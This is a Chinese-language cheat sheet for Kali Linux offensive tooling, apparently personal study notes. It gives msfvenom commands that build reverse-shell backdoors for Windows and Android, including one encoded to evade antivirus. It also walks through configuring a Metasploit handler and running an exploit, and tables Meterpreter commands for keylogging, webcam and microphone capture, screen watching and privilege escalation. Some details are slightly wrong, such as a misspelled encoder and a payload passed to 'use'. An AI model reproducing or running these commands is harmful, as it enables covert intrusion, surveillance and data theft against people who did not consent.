# Kali_Linux

## 简介

Kali Linux 是一个转为网络安全测试和渗透测试设计的 Linux 操作系统，由 Offensive Security 团队维护。它集成了大量安全工具，





## msfvenom

**msfvenom** 用于生成 Payload（漏洞利用代码或后门程序），可以将这些载荷植入目标系统，用于建立远程控制、反弹 Shell 或执行待定操作。

#### 核心用途：

- 生成针对不同平台（Windows、Linux、Android、Mac）的 Payload
- 支持多种输出格式（可执行文件exe、脚本、Shellcode）等
- 编码 Payload 可以绕过杀毒软件（AV）检测

#### 常用命令

```bash
# 生成 Windows 反向 TCP Shell（目标链接回攻击者）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击者ip LPORT=端口 -f exe > 文件名称.exe

# 生成 Android APK 后门
msfvenom -p android/meterpreter/reverse_tcp LHOST=攻击者ip LPORT=端口 -o 文件名.apk

# 生成 Linux Shellcode（编码绕过检测）
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ip LPORT=端口 -e x86/shikate_ga_nai -f c
```

## msfconsole

**msfconsole** 是 Metasploit 的交互式命令界面，用于管理渗透测试全流程，

#### 包括：

- 搜索和利用漏洞模块
- 配置攻击参数
- 启动监听器接受反弹链接
- 后渗透（Post-Exploitation）操作（提权、信息收集）

#### 核心用途：

- 执行漏洞利用（Exploit）
- 管理 Meterpreter 会话（与植入的Payload交互）
- 自动化渗透测试流程

#### 操作实例

```bash
# 启动
msfconsole

# 搜索漏洞模块
search eternalblue

# 使用漏洞模块
use windows/meterpreter/reverse_tcp

# 或者选择模块
use exploit/multi/handler
# 选择攻击模块
set payload windows/meterpreter/reverse_tcp

# 配置参数
set RHOST 目标ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 攻击者ip
set LPORT 端口

# 执行攻击
exploit

# 成功后会进入 Meterpreter 会话
ls
```

#### Meterpreter 会话命令

##### CMD指令

| 命令           | 描述                      |
| -------------- | ------------------------- |
| cat            | 读取文件内容到屏幕        |
| cd             | 切换目录                  |
| checksum       | 检索文件的校验和          |
| cp             | 复制目标文件              |
| del            | 删除文件                  |
| dir 或 ls      | 列出文件                  |
| getlwd 或 lpwd | 打印本地工作目录          |
| getwd 或 pwd   | 打印工作目录              |
| lcd            | 更改本地目录              |
| lls            | 列出本地文件              |
| mkdir          | 创建目录                  |
| mv             | 移动目标文件              |
| rm             | 删除文件                  |
| rmdir          | 删除目录                  |
| search         | 搜索文件                  |
| show_mount     | 列出所有挂载点/逻辑驱动器 |
| upload         | 上传文件或目录            |
| pkill          | 终止进程                  |

##### Meterpreter命令

| 命令            | 描述                                                 |
| --------------- | ---------------------------------------------------- |
| keyscan_start   | 开始捕获击键（开始键盘记录）                         |
| keyscan_dump    | 转储按键缓冲（下载键盘记录）                         |
| keyscan_stop    | 停止捕获击键（停止键盘记录）                         |
| record_mic      | X秒从默认的麦克风record_mic音频记录（音频录制）      |
| webcam_chat     | 开始视频聊天（视频，对方会有弹窗）                   |
| webcam_list     | 单摄像头（查看摄像头列表）                           |
| webcam_snap     | 采取快照从指定的摄像头（摄像头拍摄一张照片）         |
| webcam_stream   | 播放视频流从指定的摄像头（开启摄像头监控）           |
| enumdesktops    | 列出所有可访问的桌面和窗口站（窗体列表）             |
| getdesktop      | 得到当前的Meterpreter桌面                            |
| reboot          | 重启计算机                                           |
| shutdown        | 关闭远程计算机                                       |
| shell           | 进入系统命令                                         |
| enumdesktops    | 列出所有可访问的桌面和窗口站                         |
| getdesktop      | 获取当前的meterpreter桌面                            |
| idletime        | 返回远程用户空闲的秒数                               |
| keyboard_send   | 发送击键                                             |
| keyevent        | 发送按键事件                                         |
| keyscan_dump    | 转储击键缓冲区                                       |
| keyscan_start   | 开始捕获击键                                         |
| keyscan_stop    | 停止捕获击键                                         |
| mouse [x] [y]   | 发送鼠标事件                                         |
| screenshare     | 实时观看远程用户桌面                                 |
| screenshot      | 抓取交互式桌面的屏幕截图                             |
| setdesktop      | 更改 Meterpreters 当前桌面                           |
| uictl           | 控制一些用户界面组件                                 |
| record_mic      | 从默认麦克风录制音频 X 秒                            |
| webcam_chat     | 开始视频聊天                                         |
| webcam_list     | 列出网络摄像头                                       |
| webcam_snap     | 从指定的网络摄像头拍摄快照                           |
| webcam_stream   | 播放来自指定网络摄像头的视频流                       |
| play            | 在目标系统上播放波形音频文件 (.wav)                  |
| getsystem       | 尝试将您的权限提升到本地系统的权限                   |
| execute -f 名称 | 强制打开程序，例如：execute -f powershell 或 notepad |
